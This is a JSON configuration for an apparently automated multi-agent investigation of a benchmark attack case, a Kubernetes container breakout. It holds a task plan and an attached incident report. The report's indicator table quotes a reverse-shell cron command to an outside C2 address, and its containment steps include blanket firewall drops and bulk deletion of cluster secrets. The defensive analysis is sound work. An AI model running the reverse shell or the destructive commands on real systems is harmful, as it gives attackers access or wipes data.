@@ -1,0 +1,204 @@
+{
+  "arena_id": "arena-investigate-critical-sec-6ee216",
+  "arena_name": "K8s Container Breakout SOC Investigation\t",
+  "arena_slug": "investigate-critical-sec",
+  "mission_prompt": "Investigate critical security logs in D:\\Security-logs-test\\attack-cases-benchmark\\case-4-k8s-linux-container-breakout\\raw-logs. Reconstruct the full attack kill chain from www-data crontab reverse shell, local sudo privilege escalation, Diamorphine kernel rootkit installation, to Kubernetes privileged container escape via nsenter and cluster secrets dumping. Correlate across k8s_api_audit.json, linux_audit.log, linux_auth.log, and linux_dmesg_syslog.log.",
+  "strategy_profile": "STANDARD",
+  "units": [
+    {
+      "profile_name": "fleet-investigate-crit-ingest-raw-log-files",
+      "unit_codename": "RECON_INGESTION",
+      "task_id": "t-og-files",
+      "task_name": "Ingest Raw Log Files and Structured Audit Data",
+      "operational_stage": "RECON_INGESTION",
+      "scoped_tools": [
+        "execute_python",
+        "gather_log_evidence",
+        "read_file"
+      ],
+      "required_skills": [
+        "file_reading",
+        "data_analysis"
+      ],
+      "description": "Read all files in the specified raw\u2011logs directory (including any subdirectories) as well as the four structured audit files. Store each file\u2019s contents in memory for subsequent parsing.",
+      "input_contract": "",
+      "output_contract": "",
+      "profile_exists": true,
+      "attached_files": [
+        {
+          "id": "att-f5408fb2",
+          "filename": "case-4-k8s-linux-container-breakout.txt",
+          "file_path": "D:\\projects\\aiagent\\data\\uploads\\arena-investigate-critical-sec-6ee216\\case-4-k8s-linux-container-breakout.txt",
+          "file_type": "txt",
+          "size_bytes": 5369,
+          "extracted_text": "Executive Summary\n\nA single Kubernetes worker node (k8s-worker-node-01) was compromised through a container breakout that enabled host\u2011level access, kernel rootkit installation, cluster\u2011admin privilege escalation, credential dumping, and persistence via a reverse\u2011shell cron job. The attacker leveraged the compromised service account webapp-sa to gain unrestricted control of the Kubernetes control plane and to exfiltrate secrets. Immediate isolation, kernel integrity verification, RBAC rollback, secret rotation, and crontab cleanup are required to contain the threat and prevent lateral movement.\n\n1. Incident Overview\nPHASE\tKEY EVENT\tLOG SOURCE\tTIMESTAMP (UTC)\nReconnaissance\tCross\u2011namespace pod discovery by webapp-sa\tk8s_api_audit.json\t08:48:12\nContainer Escape\tPrivileged pod system-health-diagnostics-pod created with host access; nsenter escape\tk8s_api_audit.json, linux_dmesg_syslog.log\t08:50:04\nControl\u2011Plane Takeover\tClusterRoleBinding granting cluster-admin to webapp-sa\tk8s_api_audit.json\t08:52:18\nCredential Dumping\t/etc/shadow read by root shell; cluster secrets dumped\tlinux_audit.log, k8s_api_audit.json\t08:42:15 / 08:53:40\nKernel Compromise\tLKM diamorphine.ko loaded via insmod\tlinux_dmesg_syslog.log, linux_audit.log\t08:45:30\nPersistence\tReverse\u2011shell cron job under www-data\tlinux_auth.log\t08:39:01\nLocal Pivot\tInteractive root shell via deploy\tlinux_auth.log\t08:42:05\n2. Impact Assessment\nCATEGORY\tFINDINGS\nCluster Control\tAttacker holds cluster-admin; can modify any resource, including secrets and RBAC objects.\nHost Kernel\tRootkit installed (diamorphine.ko) provides stealth persistence and potential lateral movement to other nodes.\nCredential Exposure\tPassword hashes from /etc/shadow and all cluster secrets were extracted.\nPersistence & C2\tReverse\u2011shell cron job ensures continued foothold even after reboots.\nLateral Movement\tNo evidence of further spread beyond the compromised node; no external exfiltration detected in logs.\n3. Timeline (Compressed)\nUTC TIME\tEVENT\tINDICATOR\n08:39:01\tCron job under www-data spawns reverse shell to 198.51.100.77:4444\tC2 outbound connection\n08:42:05\tdeploy obtains root shell via sudo\tLocal pivot\n08:42:15\t/etc/shadow read (auditd syscall\u202f257)\tCredential dumping\n08:45:30\tdiamorphine.ko loaded (auditd syscall\u202f313)\tKernel compromise\n08:48:12\tCross\u2011namespace discovery by webapp-sa\tReconnaissance\n08:50:04\tPrivileged pod created; nsenter escape\tContainer breakout\n08:52:18\tClusterRoleBinding to cluster-admin\tControl\u2011plane takeover\n08:53:40\tSecret dump across namespace default\tCredential dumping\n4. Confirmed Threat Indicators (IoCs)\nINDICATOR TYPE\tVALUE\tSOURCE\nServiceAccount\tsystem:serviceaccount:frontend-apps:webapp-sa\tk8s_api_audit.json\nHost IP\t10.244.1.45\tk8s_api_audit.json\nExternal C2 IP\t198.51.100.77\tlinux_auth.log\nKernel Module\tdiamorphine.ko\tlinux_dmesg_syslog.log, linux_audit.log\nCron Job\t/bin/bash -c \"bash -i >& /dev/tcp/198.51.100.77/4444 0>&1\"\tlinux_auth.log\nPrivileged Pod\tsystem-health-diagnostics-pod (hostPID=True, hostNetwork=True, hostIPC=True, hostPath='/')\tk8s_api_audit.json\nClusterRoleBinding\tsystem-cluster-admin-binding\tk8s_api_audit.json\n5. Immediate Containment Actions\nQuarantine Node\n# On the compromised node\niptables -A INPUT -j DROP\niptables -A OUTPUT -j DROP\n\nKernel Integrity Verification & Module Removal\nlsmod | grep diamorphine\nrmmod diamorphine\n\nRevoke Elevated Privileges\nkubectl delete clusterrolebinding system-cluster-admin-binding\n\nSecret Rotation\n# Rotate all secrets in the default namespace\nkubectl get secret -n default -o name | xargs -I{} kubectl delete secret {}\n\nCron & Persistence Cleanup\ncrontab -u www-data -l | grep -v '198.51.100.77' | crontab -\ncrontab -u deploy -l | grep -v '198.51.100.77' | crontab -\n\nAuditd Logging Enhancement\necho \"auditctl -a always,exit -F arch=b64 -S insmod,finit_module -k kernel_module_load\" >> /etc/audit/rules.d/99-kernel.rules\necho \"auditctl -a always,exit -F arch=b64 -S openat -F path=/etc/shadow -k shadow_access\" >> /etc/audit/rules.d/99-shadow.rules\nservice auditd restart\n\n6. Long\u2011Term Remediation & Monitoring\nAREA\tACTION\nKernel Hardening\tEnable module signing; restrict insmod to signed modules only.\nPod Security\tEnforce PodSecurityPolicy or OPA Gatekeeper rules that deny host access unless explicitly approved.\nAudit Logging\tCentralize auditd logs to a secure, tamper\u2011evident SIEM; enable real\u2011time alerts for syscall=313 and openat /etc/shadow.\nC2 Detection\tDeploy Falco or Sysdig to flag outbound connections from cron jobs to unknown IPs.\nRBAC Review\tPeriodically audit ServiceAccounts for cluster\u2011admin privileges; enforce least privilege.\nIncident Response Playbook\tUpdate playbooks to include kernel module removal, node quarantine, and secret rotation as first\u2011line actions.\n7. Conclusion\n\nThe evidence conclusively demonstrates a multi\u2011stage compromise confined to k8s-worker-node-01. The attacker achieved full cluster control, installed a stealth kernel rootkit, harvested credentials, and established persistent reverse\u2011shell access. Immediate isolation, kernel module removal, RBAC rollback, secret rotation, and cron cleanup are mandatory to contain the threat. Enhanced monitoring and hardening will prevent recurrence and enable rapid detection of similar future attacks.",
+          "char_count": 5258,
+          "preview": "Executive Summary\n\nA single Kubernetes worker node (k8s-worker-node-01) was compromised through a container breakout that enabled host\u2011level access, kernel rootkit installation, cluster\u2011admin privilege escalation, credential dumping, and persistence via a reverse\u2011shell cron job. The attacker leveraged the compromised service account webapp-sa to gain unrestricted control of the Kubernetes control plane and to exfiltrate secrets. Immediate isolation, kernel integrity verification, RBAC rollback, secret rotation, and crontab cleanup are required to contain the threat and prevent lateral movement..."
+        }
+      ]
+    },
+    {
+      "profile_name": "fleet-investigate-crit-parse-and-extract-re",
+      "unit_codename": "RECON_INGESTION",
+      "task_id": "t-tract-re",
+      "task_name": "Parse and Extract Relevant Security Events",
+      "operational_stage": "RECON_INGESTION",
+      "scoped_tools": [
+        "execute_python",
+        "gather_log_evidence"
+      ],
+      "required_skills": [
+        "log_forensics",
+        "data_analysis"
+      ],
+      "description": "Using the ingested data, parse each log format (syslog, auditd, auth.log, Kubernetes JSON audit). Identify events related to crontab execution, reverse shell initiation, sudo usage, kernel module loading, nsenter calls, and secret dumping. Produce a structured table of extracted events with fields: timestamp, source_file, event_type, user, command/operation, target_object.",
+      "input_contract": "",
+      "output_contract": "",
+      "profile_exists": true,
+      "attached_files": []
+    },
+    {
+      "profile_name": "fleet-investigate-crit-cross-source-correla",
+      "unit_codename": "DEEP_ANALYSIS",
+      "task_id": "t--correla",
+      "task_name": "Cross\u2011Source Correlation and Timeline Construction",
+      "operational_stage": "DEEP_ANALYSIS",
+      "scoped_tools": [
+        "execute_python",
+        "triage_security_alert"
+      ],
+      "required_skills": [
+        "data_analysis",
+        "general_reasoning"
+      ],
+      "description": "Merge the event table from t2 with the Kubernetes audit data to align timestamps across hosts, containers, and API calls. Detect causal links (e.g., a crontab entry leading to a reverse shell, which triggers sudo escalation, etc.). Generate a chronological timeline highlighting key transition points.",
+      "input_contract": "",
+      "output_contract": "",
+      "profile_exists": true,
+      "attached_files": []
+    },
+    {
+      "profile_name": "fleet-investigate-crit-reconstruct-full-att",
+      "unit_codename": "RECON_INGESTION",
+      "task_id": "t-full-att",
+      "task_name": "Reconstruct Full Attack Kill Chain and Produce Summary Report",
+      "operational_stage": "RECON_INGESTION",
+      "scoped_tools": [
+        "compress_security_timeline",
+        "summarize_to_presentation",
+        "triage_security_alert"
+      ],
+      "required_skills": [
+        "general_reasoning",
+        "summarization"
+      ],
+      "description": "Using the correlated timeline, map each step to the MITRE ATT&CK techniques (e.g., T1053 for scheduled tasks, T1068 for privilege escalation, T1014 for kernel rootkits, T1071 for command & control, T1105 for remote file copy, etc.). Summarize the kill chain in a concise narrative and provide actionable recommendations to mitigate each technique.",
+      "input_contract": "",
+      "output_contract": "",
+      "profile_exists": true,
+      "attached_files": []
+    }
+  ],
+  "dag": {
+    "goal": "Investigate the critical security logs in D:\\Security-logs-test\\attack-cases-benchmark\\case-4-k8s-linux-container-breakout\\raw-logs and reconstruct the full attack kill chain from the www-data crontab reverse shell, local sudo privilege escalation, Diamorphine kernel rootkit installation, to Kubernetes privileged container escape via nsenter and cluster secrets dumping. Correlate findings across k8s_api_audit.json, linux_audit.log, linux_auth.log, and linux_dmesg_syslog.log.",
+    "reasoning": "The user requests a detailed forensic investigation of multiple log files spanning different sources (raw logs, Kubernetes audit, Linux audit, auth, dmesg). The task requires reading local files, parsing structured and unstructured data, correlating events across time, and producing a reconstructed kill chain. This is a multi\u2011step analytical process that fits the \"Investigations / Audits\" category, so we decompose it into four atomic tasks: ingesting logs, extracting relevant events, cross\u2011source correlation, and final reconstruction/report.",
+    "tasks": [
+      {
+        "id": "t1",
+        "name": "Ingest Raw Log Files and Structured Audit Data",
+        "description": "Read all files in the specified raw\u2011logs directory (including any subdirectories) as well as the four structured audit files. Store each file\u2019s contents in memory for subsequent parsing.",
+        "required_skills": [
+          "file_reading",
+          "data_analysis"
+        ],
+        "expected_output": "A dictionary mapping file paths to their raw content strings, ready for parsing.",
+        "dependencies": [],
+        "risk_level": "low",
+        "max_retries": 2,
+        "timeout_seconds": 300,
+        "parameters": {},
+        "agent_id": null,
+        "hermes_profile": "fleet-investigate-crit-ingest-raw-log-files",
+        "specialist_spec": null,
+        "_hermes_profile": "fleet-investigate-crit-ingest-raw-log-files"
+      },
+      {
+        "id": "t2",
+        "name": "Parse and Extract Relevant Security Events",
+        "description": "Using the ingested data, parse each log format (syslog, auditd, auth.log, Kubernetes JSON audit). Identify events related to crontab execution, reverse shell initiation, sudo usage, kernel module loading, nsenter calls, and secret dumping. Produce a structured table of extracted events with fields: timestamp, source_file, event_type, user, command/operation, target_object.",
+        "required_skills": [
+          "log_forensics",
+          "data_analysis"
+        ],
+        "expected_output": "A unified CSV/JSON table of all relevant security events sorted by timestamp.",
+        "dependencies": [
+          "t1"
+        ],
+        "risk_level": "low",
+        "max_retries": 2,
+        "timeout_seconds": 300,
+        "parameters": {},
+        "agent_id": null,
+        "hermes_profile": "fleet-investigate-crit-parse-and-extract-re",
+        "specialist_spec": null,
+        "_hermes_profile": "fleet-investigate-crit-parse-and-extract-re"
+      },
+      {
+        "id": "t3",
+        "name": "Cross\u2011Source Correlation and Timeline Construction",
+        "description": "Merge the event table from t2 with the Kubernetes audit data to align timestamps across hosts, containers, and API calls. Detect causal links (e.g., a crontab entry leading to a reverse shell, which triggers sudo escalation, etc.). Generate a chronological timeline highlighting key transition points.",
+        "required_skills": [
+          "data_analysis",
+          "general_reasoning"
+        ],
+        "expected_output": "A detailed timeline (CSV/JSON) showing event sequence and causal relationships.",
+        "dependencies": [
+          "t2"
+        ],
+        "risk_level": "low",
+        "max_retries": 2,
+        "timeout_seconds": 300,
+        "parameters": {},
+        "agent_id": null,
+        "hermes_profile": "fleet-investigate-crit-cross-source-correla",
+        "specialist_spec": null,
+        "_hermes_profile": "fleet-investigate-crit-cross-source-correla"
+      },
+      {
+        "id": "t4",
+        "name": "Reconstruct Full Attack Kill Chain and Produce Summary Report",
+        "description": "Using the correlated timeline, map each step to the MITRE ATT&CK techniques (e.g., T1053 for scheduled tasks, T1068 for privilege escalation, T1014 for kernel rootkits, T1071 for command & control, T1105 for remote file copy, etc.). Summarize the kill chain in a concise narrative and provide actionable recommendations to mitigate each technique.",
+        "required_skills": [
+          "general_reasoning",
+          "summarization"
+        ],
+        "expected_output": "A structured report (Markdown or JSON) containing: 1) Kill\u2011chain diagram description, 2) Technique mapping table, 3) Timeline summary, 4) Remediation recommendations.",
+        "dependencies": [
+          "t3"
+        ],
+        "risk_level": "low",
+        "max_retries": 2,
+        "timeout_seconds": 300,
+        "parameters": {},
+        "agent_id": null,
+        "hermes_profile": "fleet-investigate-crit-reconstruct-full-att",
+        "specialist_spec": null,
+        "_hermes_profile": "fleet-investigate-crit-reconstruct-full-att"
+      }
+    ],
+    "estimated_completion_seconds": 60
+  },
+  "status": "completed",
+  "created_at": 1793004208.3560174,
+  "updated_at": 1793007131.521608,
+  "profiles_to_create": [
+    "fleet-investigate-crit-cross-source-correla",
+    "fleet-investigate-crit-ingest-raw-log-files",
+    "fleet-investigate-crit-parse-and-extract-re",
+    "fleet-investigate-crit-reconstruct-full-att"
+  ],
+  "profiles_existing": [],
+  "workflow_id": "fleet-arena-investigate-critical-sec-6ee216-119296",
+  "agent_id": null,
+  "resilience": "standard"
+}
